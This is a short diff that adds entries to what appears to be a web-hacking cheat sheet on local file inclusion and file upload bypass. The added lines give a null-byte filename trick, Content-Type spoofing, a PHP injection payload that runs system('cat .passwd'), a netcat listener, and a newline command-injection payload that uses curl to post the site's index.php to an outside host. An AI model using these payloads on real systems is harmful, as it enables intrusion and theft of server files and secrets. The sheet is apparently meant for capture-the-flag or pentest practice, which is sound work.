@@ -12,3 +12,16 @@ If file contains input *.php, than it is mb a LFI(Local File Inclusion).
 You can past filter for view php file (base64 format) on server
 <pre>php://filter/convert.base64-encode/resource=
 </pre>
+You can use <b>%00</b> for "Zero Byte" in filename <br>
+Content types headers
+<pre>Content-Type: image/jpeg
+</pre>
+Payloads examples
+<pre>?page=../.passwd','..') === true || system("cat .passwd") || strpos('includes/index
+</pre>
+Reverse check request by nc
+<pre>nc -lvvp 1333
+</pre>
+RCE(Remote Code Execution) with hexadecimal octet (bash)
+<pre>ip=ya.ru %0a curl -X POST -F file=@index.php next-way.by:1333    
+</pre>
